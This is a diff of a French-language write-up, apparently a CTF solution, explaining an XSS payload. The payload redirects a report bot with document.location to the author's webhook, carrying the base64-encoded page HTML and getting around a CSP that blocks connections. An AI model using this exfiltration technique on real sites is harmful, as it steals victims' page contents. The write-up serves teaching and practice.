@@ -64,7 +64,8 @@ Voici le payload complet, je l'explique ci-dessous :
 - `document.location="..."` : La CSP contient connect-src 'none' donc seules les redirections HTTP sont autorisées, document.location nous permet ça
 - `//webhook...` : Toute cette partie est simplement mon serveur HTTP, qui permet de recevoir les requêtes, on veut envoyer le bot sur ce lien avec les informations qui nous intéressent, et le // correspond juste au https://
 - `btoa(document.documentElement.outerHTML)` : on veut récupérer document.documentElement.outerHTML, qui est la racine du dom, ce qui contient tout le html visible par le bot. La méthode BTOA permet simplement d'encoder en base64, pour que les balises html présentes dans document.do... ne cassent pas la requête.
-
+- On encode tout le payload en URL pour que les balises HTML, les guillemets etc ne cassent pas la requête
+  
 En envoyant ce lien dans la page report, on reçoit tout le document.documentElement.outerHTML en requête sur notre webhook :
 
 <img width="1096" height="469" alt="image" src="https://github.com/user-attachments/assets/f3869f0c-8504-4b50-b68f-648cb07838b5" />
